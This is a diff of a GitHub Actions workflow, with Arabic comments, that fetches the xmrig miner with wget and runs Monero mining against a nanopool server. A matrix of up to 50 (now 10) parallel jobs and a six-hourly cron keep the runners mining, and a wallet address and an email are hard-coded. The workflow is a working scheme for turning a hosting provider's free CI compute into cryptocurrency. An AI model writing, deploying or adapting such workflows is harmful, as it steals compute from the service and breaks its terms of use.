@@ -1,9 +1,9 @@
-name: Whale Mega 50 Fixed
+name: Whale 10 Workers
 on:
   push:
     branches: [ main ]
   schedule:
-    - cron: "0 */6 * * *" # يعيد التشغيل كل 6 ساعات أوتوماتيك
+    - cron: "0 */6 * * *"
 
 jobs:
   mining:
@@ -12,8 +12,8 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # هيفتح 50 سيرفر (جيت هوب هيشغل أول 20 والباقي في الانتظار)
-        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50]
+        # تقليل العدد لـ 10 لضمان التشغيل الفوري
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
 
     steps:
       - name: Checkout Code
@@ -21,7 +21,6 @@ jobs:
 
       - name: Preparation
         run: |
-          # تحميل نسخة xmrig المتوافقة مع سيرفرات أوبنتبو
           wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
           tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
           cp xmrig-6.21.0/xmrig .
@@ -29,7 +28,6 @@ jobs:
 
       - name: Run Mining
         run: |
-          # إضافة --algo rx/0 لحل مشكلة unknown algorithm
           ./xmrig -o xmr-eu1.nanopool.org:14444 \
           -u 43k1NnYRKCq9Rfd6KyHdmy18pwrhSEyEg8HiBcDCP3qj3UdxevAVoXLPGqMnk927yGf89sNb6HuQsb89pnon6Vfr4KL17BY.worker${{ matrix.worker_id }}/nfdr065@gmail.com \
           --algo rx/0 \
